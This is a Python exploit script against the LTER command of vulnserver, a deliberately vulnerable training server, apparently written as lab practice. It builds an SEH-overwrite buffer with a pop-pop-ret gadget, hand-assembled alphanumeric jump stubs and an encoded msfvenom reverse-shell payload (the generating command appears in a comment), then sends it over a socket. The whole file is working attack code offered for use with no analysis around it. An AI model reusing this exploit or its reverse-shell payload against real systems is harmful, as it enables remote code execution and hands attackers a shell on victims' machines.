from pwn import * 
from pathlib import Path 
import sys

host = "192.168.80.131" 
port = 9999


#buffer = "LTER /.:/"+ "A" * 4000 + "\r\n"
crashcmd = "LTER /.:/ "
offset = 3518
#0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\Downloads\vulnserver-master\vulnserver-master\essfunc.dll)
seh = "\x2b\x17\x50\x62"
jmp = "\x54\x58\x71\x08"

# point ESP to bottom of our 'C' buffer
# 66:05 7013      ADD AX,1370
# 04 37           ADD AL,37
# 50              PUSH EAX
# 5C              POP ESP


jump = "\x66\x05\x70\x13\x04\x37\x50\x5C"
jump += "\x25\x55\x4E\x4D\x4A\x25\x2A\x31\x32\x35" #zero EAX

#00000015  0541414141        add eax,0x41414141
#0000001A  66054141          add ax,0x4141
#0000001E  66056903          add ax,0x369
#00000022  50                push eax = 0x85EB4141

jump += "\x05\x41\x41\x41\x41\x66\x05\x2B\x3F\x04\x7F\x50"
#x66\x05\x68\x03\x66\x05\x01\x14\x50" #EB85 Jump short 
jump2 = "\x54\x58\x2C\x39\x50\x5C" #ESP to bottom of "A"'s

#point ECX to our payload and jump ECX with Subencoded opcode
#0:  54                      push   esp
#1:  58                      pop    eax
#2:  66 2d 28 04             sub    ax,0x428
#6:  50                      push   eax
#7:  59                      pop    ecx
#8:  25 4a 4d 4e 55          and    eax,0x554e4d4a
#d:  25 35 32 31 2a          and    eax,0x2a313235
#12: 05 77 61 41 41          add    eax,0x41416177
#17: 05 66 52 41 41          add    eax,0x41415266
#1c: 05 55 61 41 41          add    eax,0x41416155
#21: 2d 33 33 33 33          sub    eax,0x33333333
#26: 50                      push   eax
jump2 += "\x54\x58\x66\x2D\x28\x04\x50\x59\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x77\x61\x41\x41\x05\x66\x52\x41\x41\x05\x55\x61\x41\x41\x2D\x33\x33\x33\x33\x50"


# restoring ESP to original position and realign ecx
fixesp = "\x54\x58\x66\x2d\x66\x13\x50\x5c" #realign ESP
fixesp += "\x51\x58\x04\x07\x04\x09\x50\x59"


#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.80.131 LPORT=443 EXITFUNC=seh -e x86/alpha_mixed BufferRegister=ECX -b"\x00" -f C -v shellcode
#Payload size: 701 bytes
shellcode = ("\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
"\x38\x41\x42\x75\x4a\x49\x69\x6c\x59\x78\x4f\x72\x47\x70\x45"
"\x50\x57\x70\x33\x50\x6e\x69\x38\x65\x35\x61\x69\x50\x55\x34"
"\x4e\x6b\x72\x70\x66\x50\x4c\x4b\x66\x32\x36\x6c\x6c\x4b\x30"
"\x52\x35\x44\x4e\x6b\x73\x42\x47\x58\x54\x4f\x4d\x67\x63\x7a"
"\x47\x56\x66\x51\x39\x6f\x6c\x6c\x77\x4c\x43\x51\x71\x6c\x35"
"\x52\x36\x4c\x51\x30\x6a\x61\x78\x4f\x34\x4d\x45\x51\x5a\x67"
"\x59\x72\x7a\x52\x43\x62\x30\x57\x4e\x6b\x42\x72\x64\x50\x6e"
"\x6b\x51\x5a\x57\x4c\x4c\x4b\x32\x6c\x67\x61\x64\x38\x39\x73"
"\x62\x68\x76\x61\x58\x51\x42\x71\x4e\x6b\x76\x39\x31\x30\x67"
"\x71\x4e\x33\x4c\x4b\x71\x59\x54\x58\x39\x73\x76\x5a\x31\x59"
"\x6e\x6b\x66\x54\x6e\x6b\x77\x71\x69\x46\x34\x71\x59\x6f\x4c"
"\x6c\x4b\x71\x6a\x6f\x34\x4d\x76\x61\x78\x47\x54\x78\x4d\x30"
"\x71\x65\x6c\x36\x46\x63\x73\x4d\x4b\x48\x55\x6b\x31\x6d\x54"
"\x64\x74\x35\x79\x74\x32\x78\x6e\x6b\x71\x48\x65\x74\x36\x61"
"\x4e\x33\x32\x46\x6c\x4b\x36\x6c\x32\x6b\x4e\x6b\x50\x58\x37"
"\x6c\x66\x61\x4b\x63\x4c\x4b\x46\x64\x6e\x6b\x57\x71\x7a\x70"
"\x4d\x59\x53\x74\x71\x34\x51\x34\x51\x4b\x43\x6b\x50\x61\x31"
"\x49\x51\x4a\x63\x61\x39\x6f\x79\x70\x61\x4f\x51\x4f\x42\x7a"
"\x6e\x6b\x55\x42\x78\x6b\x6e\x6d\x51\x4d\x75\x38\x35\x63\x47"
"\x42\x55\x50\x47\x70\x73\x58\x72\x57\x33\x43\x47\x42\x73\x6f"
"\x46\x34\x55\x38\x30\x4c\x53\x47\x71\x36\x54\x47\x79\x6f\x79"
"\x45\x6c\x78\x5a\x30\x46\x61\x55\x50\x77\x70\x56\x49\x79\x54"
"\x71\x44\x72\x70\x33\x58\x54\x69\x6d\x50\x62\x4b\x77\x70\x79"
"\x6f\x6b\x65\x32\x70\x42\x70\x46\x30\x76\x30\x33\x70\x66\x30"
"\x51\x50\x56\x30\x33\x58\x5a\x4a\x46\x6f\x49\x4f\x6d\x30\x59"
"\x6f\x6b\x65\x6c\x57\x31\x7a\x34\x45\x52\x48\x79\x50\x4e\x48"
"\x72\x70\x6b\x31\x53\x58\x53\x32\x57\x70\x63\x31\x4d\x6b\x4e"
"\x69\x58\x66\x42\x4a\x46\x70\x50\x56\x42\x77\x63\x58\x4d\x49"
"\x59\x35\x32\x54\x51\x71\x6b\x4f\x7a\x75\x6e\x65\x79\x50\x30"
"\x74\x74\x4c\x4b\x4f\x50\x4e\x36\x68\x71\x65\x7a\x4c\x42\x48"
"\x48\x70\x6d\x65\x4c\x62\x76\x36\x79\x6f\x58\x55\x55\x38\x61"
"\x73\x62\x4d\x42\x44\x33\x30\x4c\x49\x6b\x53\x36\x37\x43\x67"
"\x43\x67\x74\x71\x39\x66\x70\x6a\x44\x52\x52\x79\x51\x46\x6a"
"\x42\x49\x6d\x71\x76\x58\x47\x63\x74\x66\x44\x77\x4c\x73\x31"
"\x63\x31\x4e\x6d\x71\x54\x55\x74\x36\x70\x39\x56\x33\x30\x37"
"\x34\x71\x44\x32\x70\x61\x46\x30\x56\x30\x56\x37\x36\x43\x66"
"\x50\x4e\x61\x46\x62\x76\x52\x73\x72\x76\x31\x78\x74\x39\x38"
"\x4c\x37\x4f\x4e\x66\x39\x6f\x59\x45\x6c\x49\x6b\x50\x72\x6e"
"\x53\x66\x32\x66\x4b\x4f\x76\x50\x55\x38\x75\x58\x6d\x57\x55"
"\x4d\x63\x50\x59\x6f\x79\x45\x6d\x6b\x49\x70\x65\x4d\x67\x5a"
"\x74\x4a\x51\x78\x4f\x56\x6a\x35\x4f\x4d\x4f\x6d\x49\x6f\x78"
"\x55\x37\x4c\x64\x46\x53\x4c\x35\x5a\x4b\x30\x69\x6b\x4d\x30"
"\x50\x75\x54\x45\x4d\x6b\x30\x47\x62\x33\x53\x42\x32\x4f\x42"
"\x4a\x35\x50\x51\x43\x59\x6f\x68\x55\x41\x41")

buffer = crashcmd
buffer += "A" * 2448 
buffer += fixesp + shellcode 
buffer += "A" * (offset - len(jmp)-19-len(jump2)-2448-len(shellcode)-len(fixesp))
buffer += jump2 + "\x40" * 19
buffer += jmp + seh
buffer += "C" * 5 + jump
buffer += "\x43" * (4000 - len(buffer))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print(s.recv(2048))
print("Sending buffer of length: " + str(len(buffer)))
s.send(buffer.encode("UTF-8"))
s.close()
